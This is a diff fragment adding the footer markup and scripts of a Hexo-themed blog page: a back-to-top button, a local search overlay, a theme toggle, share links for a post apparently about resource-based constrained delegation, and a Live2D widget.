+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Theme by tiehanhan | Powered by tiehanhan</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F04%2F16%2F%25E5%259F%25BA%25E4%25BA%258E%25E8%25B5%2584%25E6%25BA%2590%25E7%259A%2584%25E7%25BA%25A6%25E6%259D%259F%25E5%25A7%2594%25E6%25B4%25BE%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/04/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
